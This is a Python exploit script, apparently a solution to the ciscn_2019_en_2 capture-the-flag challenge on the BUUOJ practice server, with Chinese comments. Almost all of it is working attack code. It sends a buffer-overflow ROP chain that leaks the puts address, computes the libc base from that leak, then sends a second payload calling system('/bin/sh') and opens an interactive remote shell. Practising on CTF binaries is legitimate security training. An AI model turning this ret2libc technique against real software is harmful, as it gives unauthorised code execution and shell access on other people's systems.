from pwn import *


# context.log_level = 'debug'

'''
elf = ELF('../ciscn_2019_en_2')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = elf.sym['main']

print(hex(puts_plt))
print(hex(puts_got))
print(hex(main_addr))
'''

r = remote('node5.buuoj.cn', 25370)

r.sendlineafter('Input your choice!\n', '1')

pop_rdi = 0x400c83  # rdi寄存器地址
ret_addr = 0x4006b9  # 栈对齐用

puts_got = 0x602020
puts_plt = 0x4006E0
main_addr = 0x400B28

# 泄露puts地址
puts_payload = b'\x00' + b'A' * (80 + 8 - 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

r.sendlineafter('Input your Plaintext to be encrypted\n', puts_payload)

'''
# 一个个print(r.recvline())接收看看，泄露的地址到在哪里
b'Ciphertext\n'
b'\n'
b'\xc0\xd9v(\xc8\x7f\n'
b'EEEEEEE                            hh      iii                \n'  # 这行是程序正常的输出了，所以泄露的地址应该在 \xc0...\x7f\n
'''
# puts_addr = u64(r.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

print(r.recvline())
print(r.recvline())
# print(r.recvline())
# print(r.recvline())

puts_addr = u64(r.recvuntil("\n")[:-1].ljust(8, b"\x00"))
print(hex(puts_addr))

# 加载libc
elf_libc = ELF(r'../lib/libc6_2.27-0ubuntu3_amd64.so')

puts_offset = elf_libc.sym['puts']
system_offset = elf_libc.sym['system']
bash_offset = elf_libc.search(b'/bin/sh').__next__()

# 计算base地址
base_addr = puts_addr - puts_offset
system_addr = base_addr + system_offset
bash_addr = base_addr + bash_offset

print(hex(base_addr))
print(hex(system_addr))
print(hex(bash_addr))

r.sendlineafter('Input your choice!\n', '1')

# puts溢出到system函数
payload = b'\x00' + b'A' * (80 + 8 - 1) + p64(ret_addr) + p64(pop_rdi) + p64(bash_addr) + p64(system_addr)
r.sendlineafter('Input your Plaintext to be encrypted\n', payload)
r.interactive()
